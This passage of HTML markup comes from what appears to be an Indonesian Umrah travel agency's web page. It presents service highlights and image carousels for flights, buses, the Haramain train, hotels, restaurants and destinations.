<h3 class="elementor-flip-box__layer__title">
Intensif</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memberikan pelayanan  dan pendampingan penuh sejak awal pendaftaran sampai kepulangan sehingga anda lebih fokus beribadah</div></div></div></div>
</div></div></div></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-45594b4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="45594b4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-9558eb3 elementor-invisible" data-id="9558eb3" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-11ec898 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="11ec898" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-money-bill-wave"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Kompetitif</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Kami menawarkan paket dengan harga terjangkau dan tanpa tambahan biaya sejak melakukan pendaftaran</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-13bda32 elementor-invisible" data-id="13bda32" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-c8947d9 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="c8947d9" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-hands"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Sunnah</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Kami memastikan anda beribadah sesuai dengan sunnah Rasulullah SAW dan fokus mempersiapkan bekal kehidupan dunia maupun akhirat yang lebih baik</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-cabdee2 elementor-invisible" data-id="cabdee2" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-25c7804 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="25c7804" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-grip-horizontal"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Program Lengkap</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki program yang dapat anda custom  fasilitasnya sesuai keinginan dan banyak destinasi baru yang bisa anda pilih</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-e65b901 elementor-invisible" data-id="e65b901" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-db69723 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="db69723" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-user-friends"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Ikatan Silaturahmi</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Menjadi bagian dari keluarga besar seluruh jamaah kami yang rutin mengadakan silaturahmi</div></div></div></div>
</div></div></div></div></div>
</div></section><div class="elementor-element elementor-element-3f2bbba e-con-full e-flex e-con" data-id="3f2bbba" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;}">
<div class="elementor-element elementor-element-1d720e0 elementor-widget elementor-widget-heading" data-id="1d720e0" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Experience</span></h2></div></div>
<div class="elementor-element elementor-element-a34114d e-flex e-con-boxed e-con" data-id="a34114d" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-5a395fb elementor-widget elementor-widget-heading" data-id="5a395fb" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Akomodasi</h2></div></div>
<div class="elementor-element elementor-element-3e8acbf elementor-widget elementor-widget-heading" data-id="3e8acbf" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">| Kenyamanan & Kualitas adalah kelebihan kami</h2></div></div>
</div></div>
</div>
<div class="elementor-element elementor-element-64adcd2 e-con-full e-flex e-con" data-id="64adcd2" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-d2521da e-con-full e-flex e-con" data-id="d2521da" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-85643f1 elementor-widget elementor-widget-heading" data-id="85643f1" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Pesawat</h2></div></div>
<div class="elementor-element elementor-element-3f568f2 elementor-widget elementor-widget-text-editor" data-id="3f568f2" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Kami menggunakan maskapai dengan penerbangan tanpa transit mulai dari kelas ekonomi sampai dengan kelas bisnis</p></div></div>
<div class="elementor-element elementor-element-97e0768 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="97e0768" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3369.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3366.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3367.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
<div class="elementor-element elementor-element-12bb905 e-con-full e-flex e-con" data-id="12bb905" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-4b6cc4c elementor-widget elementor-widget-heading" data-id="4b6cc4c" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Bus & Kendaraan Pribadi</h2></div></div>
<div class="elementor-element elementor-element-f975514 elementor-widget elementor-widget-text-editor" data-id="f975514" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Kami menyediakan bus eksekutif / kendaraan pribadi keluaran terbaru yang dapat dipilih untuk mengakomodir keperluan anda</p></div></div>
<div class="elementor-element elementor-element-2ddb5b3 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="2ddb5b3" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3370.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3371.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3372.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3373.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3374.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3375.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3376.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
<div class="elementor-element elementor-element-8eca82e e-con-full e-flex e-con" data-id="8eca82e" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-ae7712c elementor-widget elementor-widget-heading" data-id="ae7712c" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Kereta Cepat</h2></div></div>
<div class="elementor-element elementor-element-d1dd9be elementor-widget elementor-widget-text-editor" data-id="d1dd9be" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Tingkatkan kenyamanan ibadah anda dengan menggunakan kereta cepat Haramain</p></div></div>
<div class="elementor-element elementor-element-7de5480 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="7de5480" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3378.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3379.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3377.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3380.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3381.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3382.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3383.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
</div>
<div class="elementor-element elementor-element-273c11c e-con-full e-flex e-con" data-id="273c11c" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;}"><div class="elementor-element elementor-element-f45f841 e-flex e-con-boxed e-con" data-id="f45f841" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e55d679 elementor-widget elementor-widget-heading" data-id="e55d679" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">pelayanan</h2></div></div>
<div class="elementor-element elementor-element-9d29971 elementor-widget elementor-widget-heading" data-id="9d29971" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">| Kenyamanan & Kualitas adalah kelebihan kami</h2></div></div>
</div></div></div>
<div class="elementor-element elementor-element-af2f7db e-con-full e-flex e-con" data-id="af2f7db" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-4fe81fc e-con-full e-flex e-con" data-id="4fe81fc" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-47d5814 elementor-widget elementor-widget-heading" data-id="47d5814" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotel</h2></div></div>
<div class="elementor-element elementor-element-977c6d3 elementor-widget elementor-widget-text-editor" data-id="977c6d3" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Tersedia berbagai pilihan hotel yang dekat dengan masjid nabawi dan masijidil haram dengan fasilitas terbaik untuk menunjang kemudahan ibadah anda</p></div></div>
<div class="elementor-element elementor-element-4f15ed3 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="4f15ed3" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3387.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3388.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3389.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3390.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3391.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3392.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3393.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3394.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3395.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3396.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3397.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
<div class="elementor-element elementor-element-834fc6b e-con-full e-flex e-con" data-id="834fc6b" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-2a4b57c elementor-widget elementor-widget-heading" data-id="2a4b57c" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Restaurant</h2></div></div>
<div class="elementor-element elementor-element-1373a37 elementor-widget elementor-widget-text-editor" data-id="1373a37" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Nikmati jamuan spesial ala Timur Tengah dengan beragam keunikan rasa</p></div></div>
<div class="elementor-element elementor-element-758da89 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="758da89" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3398.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3402.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3403.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3404.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3405.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3406.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3407.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3408.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
<div class="elementor-element elementor-element-4846085 e-con-full e-flex e-con" data-id="4846085" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;full&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-element elementor-element-eebb03a elementor-widget elementor-widget-heading" data-id="eebb03a" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Destinasi</h2></div></div>
<div class="elementor-element elementor-element-b2751a2 elementor-widget elementor-widget-text-editor" data-id="b2751a2" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Buat perjalanan ibadah anda lebih berkesan dengan banyak pilihan destinasi tambahan</p></div></div>
<div class="elementor-element elementor-element-13d4da9 elementor-absolute elementor-skin-carousel elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="13d4da9" data-element_type="widget" data-settings="{&quot;slides_per_view&quot;:&quot;1&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;_position&quot;:&quot;absolute&quot;,&quot;skin&quot;:&quot;carousel&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default"><div class="elementor-widget-container"><div class="elementor-swiper"><div class="elementor-main-swiper swiper">
<div class="swiper-wrapper">
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3409.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3411.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3413.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3421.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3424.jpg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/WhatsApp-Image-2023-01-29-at-12.53.25-PM-1.jpeg') }}&#039;)"></div></div>
<div class="swiper-slide"><div class="elementor-carousel-image" style="background-image: url(&#039;{{ asset('/wp-content/uploads/2023/10/IMG_3418.jpg') }}&#039;)"></div></div>
</div>
<div class="elementor-swiper-button elementor-swiper-button-prev">
<i aria-hidden="true" class="eicon-chevron-left"></i>							<span class="elementor-screen-only">Previous</span>
</div>
<div class="elementor-swiper-button elementor-swiper-button-next">
<i aria-hidden="true" class="eicon-chevron-right"></i>							<span class="elementor-screen-only">Next</span>
</div>
</div></div></div></div>
</div>
</div>
<section class="elementor-section elementor-top-section elementor-element elementor-element-505e11f5 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-invisible" data-id="505e11f5" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;animation&quot;:&quot;fadeInDown&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-9a96f2a elementor-invisible" data-id="9a96f2a" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:400}"><div class="elementor-widget-wrap elementor-element-populated"><section class="elementor-section elementor-inner-section elementor-element elementor-element-28965852 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="28965852" data-element_type="section"><div class="elementor-container elementor-column-gap-default"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-607158d6" data-id="607158d6" data-element_type="column"><div class="elementor-widget-wrap 